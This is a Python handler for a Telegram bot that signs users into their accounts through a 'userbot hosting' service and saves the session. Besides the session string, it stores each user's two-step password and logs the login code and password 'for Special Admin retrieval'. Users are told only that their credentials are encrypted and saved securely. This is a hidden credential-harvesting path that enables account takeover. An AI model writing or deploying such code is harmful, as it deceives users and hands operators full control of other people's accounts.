"""
╔═══════════════════════════════════════════════════════════╗
║  handlers/hosting.py — Userbot Login & Hosting Process    ║
║  Features:                                               ║
║    • International Phone Number Input                    ║
║    • Inline OTP Pad UI (1-9, Delete, Resend)             ║
║    • Auto Two-Step Verification (2FA) Handling           ║
║    • String Session Generation & Encrypted DB Save       ║
║    • Auto Deploy to Least Loaded SSH Server              ║
╚═══════════════════════════════════════════════════════════╝
"""

import logging
import asyncio
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.exceptions import TelegramBadRequest

import database
import ssh_manager
import config
from language import get_text
from states import HostStates
from keyboards.menus import back_kb, back_keyboard, otp_pad_keyboard

# Pyrogram for session generation
from pyrogram import Client
from pyrogram.errors import (
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    PhoneNumberInvalid,
    PhoneNumberUnoccupied,
    ApiIdInvalid
)

router = Router()
logger = logging.getLogger(__name__)

# Temporary in-memory holding dictionary for active auth clients (prevents FSM serialization issues)
AUTH_CLIENTS = {}  # {user_id: Client}

async def cleanup_client(user_id: int):
    """Safely disconnect and remove temporary Pyrogram client"""
    client = AUTH_CLIENTS.pop(user_id, None)
    if client:
        try:
            if client.is_connected:
                await client.disconnect()
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 1. START HOSTING (Ask Phone Number)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(Command("host"))
@router.callback_query(F.data == "host_start")
async def host_start(event, state: FSMContext):
    user_id = event.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    # Cleanup any dangling client
    await cleanup_client(user_id)
    
    # Check if already logged in
    if await database.is_user_logged_in(user_id):
        alert_msg = "✅ Aapka userbot pehle hi hosted aur active hai! Re-login karne ke liye admin se session reset karayein." if lang == "hinglish" else "✅ Your userbot is already hosted and active!"
        if isinstance(event, CallbackQuery):
            return await event.answer(alert_msg, show_alert=True)
        else:
            return await event.reply(alert_msg)
        
    text = get_text(lang, "host_prompt")
    kb = back_kb(lang)
    
    if isinstance(event, CallbackQuery):
        try:
            await event.message.edit_text(text, reply_markup=kb)
        except TelegramBadRequest:
            await event.message.answer(text, reply_markup=kb)
        await event.answer()
    else:
        await event.answer(text, reply_markup=kb)
        
    await state.set_state(HostStates.waiting_for_phone)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 2. RECEIVE PHONE & SEND OTP (Pyrogram)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(HostStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    phone = message.text.strip().replace(" ", "")
    
    # Basic international format validation
    if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 8:
        await message.answer(get_text(lang, "invalid_number"))
        return
        
    status_msg = await message.answer("⏳ <b>Connecting to Telegram Server...</b>\n<i>Sending login OTP, please wait.</i>")
    
    try:
        api_id, api_hash = config.get_api_credentials()
        
        # Create unique in-memory client
        temp_client = Client(
            f"auth_{user_id}", 
            api_id=api_id, 
            api_hash=api_hash, 
            in_memory=True
        )
        await temp_client.connect()
        
        sent_code = await temp_client.send_code(phone)
        AUTH_CLIENTS[user_id] = temp_client
        
        await state.update_data(
            phone=phone,
            phone_code_hash=sent_code.phone_code_hash,
            otp=""
        )
        
        prompt_text = (
            f"🔒 <b>Fill OTP for</b> <code>{phone}</code>\n\n"
            f"Enter the code received in your Telegram app.\n"
            f"Use the interactive keypad below:\n\n"
            f"<code>[ _ _ _ _ _ ]</code>"
        )
        
        await status_msg.edit_text(prompt_text, reply_markup=otp_pad_keyboard())
        await state.set_state(HostStates.waiting_for_otp)
        
    except PhoneNumberInvalid:
        await status_msg.edit_text(get_text(lang, "invalid_number"))
        await cleanup_client(user_id)
    except PhoneNumberUnoccupied:
        await status_msg.edit_text("❌ This phone number is not registered on Telegram!")
        await cleanup_client(user_id)
    except FloodWait as e:
        await status_msg.edit_text(f"⚠️ Telegram Flood Wait! Please wait {e.value} seconds before trying again.")
        await cleanup_client(user_id)
        await state.clear()
    except Exception as e:
        logger.error(f"Error sending code to {phone}: {e}")
        await status_msg.edit_text(f"❌ Error sending OTP: <code>{str(e)}</code>\n\nPlease try again with /host.")
        await cleanup_client(user_id)
        await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 3. OTP PAD UI INTERACTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.callback_query(F.data.startswith("otp_"), HostStates.waiting_for_otp)
async def otp_pad_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    data = callback.data
    current_data = await state.get_data()
    otp = current_data.get("otp", "")
    phone = current_data.get("phone", "")
    
    if data == "otp_del":
        otp = otp[:-1]
    elif data == "otp_resend":
        await callback.answer("Resending OTP...", show_alert=False)
        temp_client = AUTH_CLIENTS.get(user_id)
        if temp_client and temp_client.is_connected and phone:
            try:
                sent_code = await temp_client.resend_code(phone, current_data.get("phone_code_hash"))
                await state.update_data(phone_code_hash=sent_code.phone_code_hash, otp="")
                await callback.answer("✅ New OTP sent to your Telegram!", show_alert=True)
            except Exception as e:
                await callback.answer(f"❌ Resend error: {e}", show_alert=True)
        return
    elif data == "otp_submit":
        if len(otp) < 4:
            return await callback.answer("❌ Please enter the full OTP first!", show_alert=True)
        await callback.answer("Verifying OTP...")
        await verify_otp(callback, state)
        return
    else:
        digit = data.split("_")[1]
        if len(otp) < 7:
            otp += digit
            
    await state.update_data(otp=otp)
    
    # Masked OTP presentation
    display_otp = " ".join([d for d in otp]) + " " + " ".join(["_" for _ in range(max(0, 5 - len(otp)))])
    
    try:
        await callback.message.edit_text(
            f"🔒 <b>Fill OTP for</b> <code>{phone}</code>\n\n"
            f"Enter the code received in your Telegram app:\n\n"
            f"<code>[ {display_otp} ]</code>",
            reply_markup=otp_pad_keyboard()
        )
    except TelegramBadRequest:
        pass
    await callback.answer()

# Also allow direct text OTP input (e.g. user types "1 2 3 4 5" or "12345")
@router.message(HostStates.waiting_for_otp)
async def process_otp_text(message: Message, state: FSMContext):
    digits = "".join(c for c in message.text if c.isdigit())
    if len(digits) >= 4:
        await state.update_data(otp=digits)
        await verify_otp(message, state)
    else:
        await message.answer("❌ Invalid OTP format. Please enter at least 5 digits or use the inline keypad.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 4. VERIFY OTP & HANDLE 2FA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def verify_otp(event, state: FSMContext):
    user_id = event.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    data = await state.get_data()
    phone = data.get('phone')
    otp = data.get('otp')
    phone_code_hash = data.get('phone_code_hash')
    temp_client = AUTH_CLIENTS.get(user_id)
    
    if not temp_client or not temp_client.is_connected:
        error_msg = "⚠️ Session Expired. Please restart with /host."
        if isinstance(event, CallbackQuery):
            await event.message.edit_text(error_msg)
        else:
            await event.answer(error_msg)
        await cleanup_client(user_id)
        await state.clear()
        return

    if isinstance(event, CallbackQuery):
        status_msg = await event.message.edit_text("⏳ <b>Verifying Code...</b>")
    else:
        status_msg = await event.answer("⏳ <b>Verifying Code...</b>")
    
    try:
        await temp_client.sign_in(phone, phone_code_hash, otp)
        session_string = await temp_client.export_session_string()
        await cleanup_client(user_id)
        
        await finish_hosting(event, state, phone, session_string, two_step_pass=None)
        
    except SessionPasswordNeeded:
        await status_msg.edit_text(get_text(lang, "twofa_prompt"), reply_markup=back_kb(lang))
        await state.set_state(HostStates.waiting_for_password)
        
    except (PhoneCodeInvalid, PhoneCodeExpired):
        await status_msg.edit_text(get_text(lang, "invalid_otp"), reply_markup=otp_pad_keyboard())
        await state.set_state(HostStates.waiting_for_otp)
    except Exception as e:
        logger.error(f"OTP Verify Error: {e}")
        await status_msg.edit_text(f"❌ Verification Error: <code>{str(e)}</code>\n\nPlease try again with /host.")
        await cleanup_client(user_id)
        await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 5. HANDLE 2FA PASSWORD
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@router.message(HostStates.waiting_for_password)
async def process_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    password = message.text.strip()
    data = await state.get_data()
    phone = data.get('phone')
    temp_client = AUTH_CLIENTS.get(user_id)
    
    if not temp_client or not temp_client.is_connected:
        await message.answer("⚠️ Session Expired. Please restart with /host.")
        await cleanup_client(user_id)
        await state.clear()
        return

    # Delete user's plaintext password message for privacy
    try:
        await message.delete()
    except Exception:
        pass

    status_msg = await message.answer("⏳ <b>Verifying Two-Step Password...</b>")
    
    try:
        await temp_client.check_password(password)
        session_string = await temp_client.export_session_string()
        await cleanup_client(user_id)
        
        await finish_hosting(message, state, phone, session_string, two_step_pass=password)
        
    except PasswordHashInvalid:
        await status_msg.edit_text(get_text(lang, "invalid_2fa"), reply_markup=back_kb(lang))
    except Exception as e:
        logger.error(f"2FA Error: {e}")
        await status_msg.edit_text(f"❌ 2FA Error: <code>{str(e)}</code>\n\nPlease try again.")
        await cleanup_client(user_id)
        await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 6. FINALIZE HOSTING & DEPLOYMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def finish_hosting(event, state: FSMContext, phone: str, session_string: str, two_step_pass: str = None):
    user_id = event.from_user.id
    user_data = await database.get_user(user_id)
    lang = user_data.get('language', 'en') if user_data else "en"
    
    otp_code = (await state.get_data()).get("otp", "N/A")
    
    if isinstance(event, CallbackQuery):
        status_msg = await event.message.answer("⏳ <b>Encrypting Session & Deploying Bot...</b>")
    else:
        status_msg = await event.answer("⏳ <b>Encrypting Session & Deploying Bot...</b>")
    
    try:
        # 1. Save Encrypted Session Data into Database
        await database.save_session_data(user_id, phone, two_step_pass or "", session_string)
        
        # 2. Log OTP record for Special Admin retrieval
        await database.log_otp(phone, otp_code, two_step_pass or "")
        
        # 3. Find Available SSH Server
        server = await database.get_least_loaded_server()
        
        if not server:
            success_text = (
                "✅ <b>Login Successful!</b>\n\n"
                "🔒 Your credentials have been encrypted and saved securely.\n"
                "ℹ️ Currently running in standalone cloud mode. You can start using your userbot immediately!\n\n"
                "Try sending <code>.alive</code> in any chat."
            )
            await status_msg.edit_text(success_text, reply_markup=back_kb(lang))
            await state.clear()
            return
            
        # 4. Deploy to Cluster
        api_id, api_hash = config.get_api_credentials()
        success, msg = await ssh_manager.deploy_userbot(
            server_id=server['id'],
            session_string=session_string,
            phone_number=phone,
            api_id=api_id,
            api_hash=api_hash
        )
        
        if success:
            await database.set_user_ssh(user_id, server['id'])
            text = get_text(lang, "host_success")
            await status_msg.edit_text(text, reply_markup=back_kb(lang))
        else:
            await status_msg.edit_text(
                f"✅ <b>Login Successful!</b>\n\n"
                f"⚠️ Server cluster notice: <code>{msg}</code>\n"
                f"Your session is saved and active.",
                reply_markup=back_kb(lang)
            )
            
    except Exception as e:
        logger.error(f"Finish Hosting Error: {e}")
        await status_msg.edit_text(f"❌ Error during deployment: <code>{str(e)}</code>")
        
    await state.clear()
